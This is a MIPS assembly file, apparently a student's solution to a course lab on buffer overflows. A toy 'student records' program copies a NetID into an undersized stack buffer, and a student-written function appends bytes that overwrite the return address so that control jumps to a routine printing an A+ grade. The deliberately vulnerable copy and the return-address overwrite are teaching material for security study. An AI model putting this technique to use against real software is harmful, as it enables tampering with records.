#####################################################################
# FILE:	grade_change.asm                                            #
# DATE: 03/18/2017                                                  #
# NAME:	Philip Nelson                                               #
#####################################################################

#====================================================================
#       Static data allocation and initialization
#====================================================================

.data

before:	.asciiz "Accessing student record...\n"
after:  .asciiz "-- Connection to Student Records terminated --\n"
reduced_grade_string: 	.asciiz "\nStudent grade: C-\n"
new_grade_string:	.asciiz "\nStudent grade: A+\n"

.globl netid_buffer
 # this string contains the student NetID
netid_buffer:	.byte 0x4A 0x6F 0x68 0x6E 0x64 0x6F 0x65 0x0

#====================================================================
#       Program text
#====================================================================

.text
.globl main

# vulnerable function: your code will smash this function's stack frame!
main:
        sw 	$ra, 0($sp)		# save return address
        subu 	$sp, $sp, 16	# allocate stack frame, including local fixed-size buffer

        # print status message
        li 	$v0, 4
        la 	$a0, before
        syscall

        # call the stack-smashing function
        la 	$a0, netid_buffer
        jal 	attack_string

        # ensure netids are in proper format lowercase
        la 	$a0, netid_buffer
        addi 	$a1, $sp, 8	# destination buffer
        addi 	$a2, $0,  12	# length of netid_buffer, TODO: you'll need to set this appropriately
        jal 	sanitize_string
        addi 	$t0, $v0, 0

        # reduce student grade's grade to C-
        jal 	reduce_grade

connection_closed:
        # print status message
        li 	$v0, 4
        la 	$a0, after
        syscall

.globl goodbye
goodbye:
        addiu 	$sp, $sp, 16	# pop stack
        lw 	$ra, 0($sp)	# restore return address
endprog:
        li 	$v0, 10		# load system instruction 10 (terminate program) into v0 register
        syscall


# ----------------------------------------------------------------
# Function grade_query displays the current grade of the student
# ----------------------------------------------------------------
reduce_grade:
        sw 	$ra, 0($sp)
        li 	$v0, 4
        la 	$a0, reduced_grade_string
        syscall
        lw 	$ra, 0($sp)
        jr 	$ra


# ----------------------------------------------------------------
# function to update displayed student grade to A+
# ----------------------------------------------------------------
automatic_a_plus:
        sw 	$ra, 0($sp)
        li 	$v0, 4
        la 	$a0, new_grade_string
        syscall
        lw 	$ra, 0($sp)
        la 	$t0 connection_closed
        jr 	$t0


# ----------------------------------------------------------------
# Function sanitize_string fixes formatting problems with the
#   NetID, including replacing spaces with underscores
# Args:
# $a0 contains address of source buffer for student name
# $a1 contains address of destination buffer
# $a2 contains the length of the buffer to be copied
# ----------------------------------------------------------------
.globl sanitize_string
sanitize_string:
        sw 	$ra, 0($sp)
        subu 	$sp, $sp, 16

        addi 	$a1, $sp, 8
        jal 	replace_spaces

        # sanitized NetID
        li 	$v0, 4
        addi 	$a0, $sp, 8
        syscall

        addiu 	$sp, $sp, 16	# pop stack
        lw 	$ra, 0($sp)	# restore return address
        jr 	$ra


# ----------------------------------------------------------------
# Function replace_spaces replaces all spaces with underscores
# Args:
# $a0 contains address of source buffer for student name
# $a1 contains address of destination buffer
# $a2 contains the length of the buffer to be copied
# ----------------------------------------------------------------
.globl replace_spaces
replace_spaces:
        sw 	$ra, 0($sp)
        subu 	$sp, $sp, 4
        addiu 	$t0, $0, 0x20	# store ASCII value for space

top:    beq 	$a2, $0, done
        lbu 	$t1, 0($a0)
        addi 	$a0, $a0, 1
        addi 	$a2, $a2, -1
        bne 	$t1, $t0, store_char # char is already lowercase
        addiu 	$t1, $0, 0x5F	# replace spaces with underscores
store_char:
        sb 	$t1, 0($a1)
        addi 	$a1, $a1, 1
        j 	top

done:   addiu 	$sp, $sp, 4	# pop stack
        lw 	$ra, 0($sp)		# restore return address
        jr 	$ra


# ----------------------------------------------------------------
# TODO: Create this function
# Args:
# $a0 contains the address of the source buffer for student name
# ----------------------------------------------------------------
.globl attack_string
attack_string:
	ori	$t1, $0,  0	# i counter
	
attack_loop:
	add	$t2, $t1, $a0	# $t2 = &netid[i]
	lb	$t3, 0($t2)	# $t3 = netid[i]
	beq	$t3, $0, exit_attack_loop # return if ($t3 == 0) end of string
	addi	$t1, $t1, 1	# increment counter
	j	attack_loop	# loop
	
exit_attack_loop:
	addi	$t1, $t1, 1
	add	$t2, $t1, $a0	# $t2 = &netid[i]
	la	$t0, automatic_a_plus
	or	$t0, $0, 0x84
	sb	$t0, 0($t2)
	or	$t0, $0, 0x00
	sb	$t0, 1($t2)
	or	$t0, $0, 0x40
	sb	$t0, 2($t2)
	or	$t0, $0, 0x00
	sb	$t0, 3($t2)
		
	jr	$ra		# return

